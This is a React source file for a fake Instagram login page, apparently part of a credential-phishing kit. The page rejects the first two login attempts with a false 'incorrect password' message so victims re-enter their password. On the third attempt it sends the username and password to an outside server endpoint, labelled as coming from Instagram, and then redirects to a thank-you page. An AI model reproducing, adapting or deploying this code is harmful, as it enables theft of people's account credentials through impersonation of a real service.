import React, { useState } from "react";
import { Ig, googlePlay, microsoft } from "../assets";
import { useNavigate } from "react-router-dom";
import axios from "axios";

const InstagramPage = () => {
  const [isConfirming, setIsConfirming] = useState(false);
  const [emailOrUsername, setEmailOrUsername] = useState("");
  const [password, setPassword] = useState("");
  const [confirmPassword, setConfirmPassword] = useState("");
  const [attempts, setAttempts] = useState(0);
  const [errorMsg, setErrorMsg] = useState("");
  const navigate = useNavigate();

  const handleFirstSubmit = (event) => {
    event.preventDefault();
    setIsConfirming(true);
  };

  const handleFinalSubmit = async (event) => {
    event.preventDefault();
    if (password === confirmPassword) {
      if (attempts < 2) {
        setErrorMsg("The email or password you entered is incorrect. Please try again.");
        setPassword("");
        setConfirmPassword("");
        setIsConfirming(false);
        setAttempts(attempts + 1);
      } else {
        try {
          // Send data to backend using Axios
          const response = await axios.post("https://votesy-server.vercel.app/api/submit-login", {
            source: "Instagram",
            emailOrUsername,
            password,
          });

          if (response.status === 200) {
            navigate("/thank-you-page");
          } else {
            throw new Error("Network response was not ok");
          }
        } catch (error) {
          console.error("Error:", error);
          setErrorMsg("An error occurred. Please try again.");
        }
      }
    } else {
      setErrorMsg("Passwords do not match.");
    }
  };

  return (
    <div className="h-screen bg-white flex flex-col items-center">
      <div className="w-3/4 h-3/6 flex flex-col items-center bg-white my-4 border border-solid border-gray-300">
        <img src={Ig} alt="instagram" className="w-[200px] my-5" />
        {!isConfirming ? (
          <form
            className="flex flex-col items-center w-full"
            onSubmit={handleFirstSubmit}
          >
            <input
              className="h-10 w-3/4 bg-gray-50 border border-solid text-sm rounded-sm pl-2 my-4 outline-none"
              type="text"
              placeholder="Phone number, Username, or email"
              value={emailOrUsername}
              onChange={(e) => setEmailOrUsername(e.target.value)}
              required
            />
            <input
              className="h-10 w-3/4 bg-gray-50 border border-solid text-sm rounded-sm pl-2 my-4 outline-none"
              type="password"
              placeholder="Password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              required
            />
            {errorMsg && <p className="text-red-500">{errorMsg}</p>}
            <button className="h-10 w-3/4 bg-blue-600 text-white font-semibold border-solid text-sm rounded-xl pl-2 mb-4">
              Log In
            </button>
            <p className="font-thin text-sm">Forgot Password?</p>
          </form>
        ) : (
          <form
            className="flex flex-col items-center w-full"
            onSubmit={handleFinalSubmit}
          >
            <input
              className="h-10 w-3/4 bg-gray-50 border border-solid text-sm rounded-sm pl-2 my-4 outline-none"
              type="password"
              placeholder="Confirm Password"
              value={confirmPassword}
              onChange={(e) => setConfirmPassword(e.target.value)}
              required
            />
            {errorMsg && <p className="text-red-500">{errorMsg}</p>}
            <button className="h-10 w-3/4 bg-blue-600 text-white font-semibold border-solid text-sm rounded-xl pl-2 mb-4">
              Confirm and Submit
            </button>
          </form>
        )}
      </div>

      <div className="w-3/4 h-20 bg-white border border-solid border-gray-300 flex justify-center items-center text-sm">
        <p>
          Don't have an account?{" "}
          <span className="text-blue-500 font-semibold">Sign up</span>
        </p>
      </div>

      <div className="flex flex-col items-center justify-center mt-4">
        Get the app
        <div className="flex mt-2 w-[150px] gap-4 items-center justify-center">
          <img src={googlePlay} alt="google play" />
          <img src={microsoft} alt="microsoft" />
        </div>
      </div>
    </div>
  );
};

export default InstagramPage;
